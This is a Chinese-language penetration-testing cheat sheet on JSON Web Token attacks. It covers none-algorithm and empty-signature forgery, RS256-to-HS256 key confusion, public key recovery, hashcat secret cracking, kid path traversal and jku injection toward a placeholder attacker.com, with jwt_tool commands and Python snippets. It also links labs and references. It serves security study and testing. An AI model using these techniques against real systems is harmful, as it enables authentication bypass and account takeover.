# JWT - JSON Web Token

> JSON Web Token (JWT) 是一个开放标准(RFC 7519)，它定义了一种紧凑且自包含的方式，用于在各方之间作为JSON对象安全地传输信息。由于这些信息是经过数字签名的，因此可以被验证和信任。

## 目录

- [工具](#工具)
- [JWT格式](#jwt格式)
    - [头部(Header)](#头部header)
    - [有效载荷(Payload)](#有效载荷payload)
- [JWT签名](#jwt签名)
    - [JWT签名 - 空签名攻击 (CVE-2020-28042)](#jwt签名---空签名攻击-cve-2020-28042)
    - [JWT签名 - 正确签名的泄露 (CVE-2019-7644)](#jwt签名---正确签名的泄露-cve-2019-7644)
    - [JWT签名 - None算法 (CVE-2015-9235)](#jwt签名---none算法-cve-2015-9235)
    - [JWT签名 - 密钥混淆攻击 RS256 转 HS256 (CVE-2016-5431)](#jwt签名---密钥混淆攻击-rs256-转-hs256-cve-2016-5431)
    - [JWT签名 - 密钥注入攻击 (CVE-2018-0114)](#jwt签名---密钥注入攻击-cve-2018-0114)
    - [JWT签名 - 从已签名的JWT中恢复公钥](#jwt签名---从已签名的jwt中恢复公钥)
- [JWT密钥](#jwt密钥)
    - [使用密钥编码和解码JWT](#使用密钥编码和解码jwt)
    - [破解JWT密钥](#破解jwt密钥)
- [JWT声明](#jwt声明)
    - [JWT kid声明滥用](#jwt-kid声明滥用)
    - [JWKS - jku头部注入](#jwks---jku头部注入)
- [实验环境](#实验环境)
- [参考资料](#参考资料)

## 工具

- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) - 🐍 用于测试、调整和破解JSON Web Tokens的工具包
- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - 用C语言编写的JWT暴力破解工具
- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript对象签名和加密渗透测试助手
- [jwt.io](https://jwt.io/) - JWT编码器/解码器

## JWT格式

JSON Web Token: `Base64(头部).Base64(数据).Base64(签名)`

示例: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

我们可以将其分为3个由点分隔的部分：

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # 头部
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # 有效载荷
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # 签名
```

### 头部(Header)

在[JSON Web签名(JWS)RFC](https://www.rfc-editor.org/rfc/rfc7515)中定义的已注册头部参数名称。
最基本的JWT头部是以下JSON：

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

其他参数在RFC中注册。

| 参数    | 定义                           | 描述 |
|---------|-------------------------------|------|
| alg     | 算法                          | 标识用于保护JWS的加密算法 |
| jku     | JWK集URL                     | 引用一组JSON编码的公钥资源 |
| jwk     | JSON Web密钥                 | 用于数字签名JWS的公钥 |
| kid     | 密钥ID                       | 用于保护JWS的密钥 |
| x5u     | X.509 URL                    | X.509公钥证书或证书链的URL |
| x5c     | X.509证书链                 | 用于数字签名JWS的PEM编码的X.509公钥证书或证书链 |
| x5t     | X.509证书SHA-1指纹          | X.509证书DER编码的Base64 url编码的SHA-1指纹(摘要) |
| x5t#S256| X.509证书SHA-256指纹        | X.509证书DER编码的Base64 url编码的SHA-256指纹(摘要) |
| typ     | 类型                         | 媒体类型。通常为`JWT` |
| cty     | 内容类型                    | 不建议使用此头部参数 |
| crit    | 关键                        | 正在使用扩展和/或JWA |

默认算法是"HS256"(HMAC SHA256对称加密)。
"RS256"用于非对称目的(RSA非对称加密和私钥签名)。

| `alg` 参数值 | 数字签名或MAC算法                | 要求 |
|--------------|--------------------------------|------|
| HS256        | 使用SHA-256的HMAC              | 必需 |
| HS384        | 使用SHA-384的HMAC              | 可选 |
| HS512        | 使用SHA-512的HMAC              | 可选 |
| RS256        | 使用SHA-256的RSASSA-PKCS1-v1_5 | 推荐 |
| RS384        | 使用SHA-384的RSASSA-PKCS1-v1_5 | 可选 |
| RS512        | 使用SHA-512的RSASSA-PKCS1-v1_5 | 可选 |
| ES256        | 使用P-256和SHA-256的ECDSA      | 推荐 |
| ES384        | 使用P-384和SHA-384的ECDSA      | 可选 |
| ES512        | 使用P-521和SHA-512的ECDSA      | 可选 |
| PS256        | 使用SHA-256和MGF1 with SHA-256的RSASSA-PSS | 可选 |
| PS384        | 使用SHA-384和MGF1 with SHA-384的RSASSA-PSS | 可选 |
| PS512        | 使用SHA-512和MGF1 with SHA-512的RSASSA-PSS | 可选 |
| none         | 不执行数字签名或MAC            | 必需 |

使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入头部：`python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`

### 有效载荷(Payload)

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

声明(claims)是预定义的键及其值：

- iss: 令牌的发行者
- exp: 过期时间戳(拒绝已过期的令牌)。注意：根据规范，这必须是以秒为单位的。
- iat: JWT的签发时间。可用于确定JWT的年龄
- nbf: "not before"，令牌生效的未来时间。
- jti: JWT的唯一标识符。用于防止JWT被重复使用或重放。
- sub: 令牌的主题(很少使用)
- aud: 令牌的受众(也很少使用)

使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)注入有效载荷声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

## JWT签名

### JWT签名 - 空签名攻击 (CVE-2020-28042)

发送一个带有HS256算法但没有签名的JWT，如`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**利用方法**：

```powershell
python3 jwt_tool.py JWT_HERE -X n
```

**解构**：

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### JWT签名 - 正确签名的泄露 (CVE-2019-7644)

发送一个签名不正确的JWT，端点可能会响应一个错误，泄露正确的签名。

- [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
- [CVE-2019-7644: Auth0-WCF-Service-JWT中的安全漏洞](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```powershell
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### JWT签名 - None算法 (CVE-2015-9235)

JWT支持`None`算法进行签名。这可能是为了调试应用程序而引入的。然而，这可能对应用程序的安全性产生严重影响。

None算法的变体：

- `none`
- `None`
- `NONE`
- `nOnE`

要利用此漏洞，您只需要解码JWT并更改用于签名的算法。然后您可以提交新的JWT。但是，除非您**删除**签名，否则这将不起作用。

或者，您可以修改现有的JWT（请注意过期时间）

- 使用[ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```powershell
    python3 jwt_tool.py [JWT_HERE] -X a
    ```

- 手动编辑JWT

    ```python
    import jwt

    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
    decodedToken = jwt.decode(jwtToken, verify=False)       

    # 在使用'None'类型编码之前解码令牌
    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

    print(noneEncoded.decode())
    ```

### JWT签名 - 密钥混淆攻击 RS256 转 HS256 (CVE-2016-5431)

如果服务器的代码期望使用"alg"设置为RSA的令牌，但收到"alg"设置为HMAC的令牌，则可能会在验证签名时无意中使用公钥作为HMAC对称密钥。

由于攻击者有时可以获取公钥，攻击者可以将标头中的算法修改为HS256，然后使用RSA公钥对数据进行签名。当应用程序使用与其TLS Web服务器相同的RSA密钥对时：`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> **HS256**算法使用密钥对每条消息进行签名和验证。
> **RS256**算法使用私钥对消息进行签名，并使用公钥进行身份验证。

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

### JWT签名 - 密钥注入攻击 (CVE-2018-0114)

某些JWT库容易受到密钥注入攻击，攻击者可以通过在JWT头部注入自己的公钥来伪造令牌。

### JWT签名 - 从已签名的JWT中恢复公钥

如果您有两个使用相同RSA私钥签名的JWT，您可能能够恢复公钥。

```bash
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```

## JWT密钥

### 使用密钥编码和解码JWT

```bash
# 使用密钥编码JWT
echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '='
echo -n '{"sub":"1234567890","name":"John Doe","iat":1516239022}' | base64 | tr '/+' '_-' | tr -d '='
echo -n -e '{"typ":"JWT","alg":"HS256"}.{"sub":"1234567890","name":"John Doe","iat":1516239022}' | openssl dgst -sha256 -hmac "your-256-bit-secret" -binary | base64 | tr '/+' '_-' | tr -d '='

# 使用密钥解码JWT
jwt decode JWT_HERE
jwt decode JWT_HERE --secret your-256-bit-secret
```

### 破解JWT密钥

使用hashcat破解JWT密钥：

- 字典攻击：`hashcat -a 0 -m 16500 jwt.txt passlist.txt`
- 基于规则的攻击：`hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
- 暴力破解攻击：`hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`

## JWT声明

### JWT kid声明滥用

`kid`(密钥ID)是JWT头部中的一个可选声明，用于指定用于验证令牌的密钥。如果应用程序未正确验证`kid`参数，攻击者可能会利用此漏洞来注入自己的密钥。

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../dev/null"
}
```

### JWKS - jku头部注入

如果应用程序使用`jku`(JWK Set URL)头部参数从外部URL加载JWK集，攻击者可能会注入自己的JWK集URL，从而控制用于验证令牌的公钥。

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

## 实验环境

- [PortSwigger - JWT认证绕过](https://portswigger.net/web-security/jwt)
- [Root Me - JWT - 弱密钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
- [Root Me - JWT - 不安全的文件签名](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
- [Root Me - JWT - 公钥](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
- [Root Me - JWT - 头部注入](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
- [Root Me - JWT - 不安全的密钥处理](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

## 参考资料

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [RFC 7515 - JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
- [RFC 7517 - JSON Web Key (JWK)](https://tools.ietf.org/html/rfc7517)
- [RFC 7518 - JSON Web Algorithms (JWA)](https://tools.ietf.org/html/rfc7518)
- [JWT.io - 介绍](https://jwt.io/introduction/)
- [Auth0 - JWT手册](https://auth0.com/resources/ebooks/jwt-handbook)
- [PortSwigger - JWT攻击](https://portswigger.net/web-security/jwt)
- [OWASP - JWT备忘单](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT安全最佳实践](https://curity.io/resources/learn/jwt-best-practices/)
- [JWT攻击速查表](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
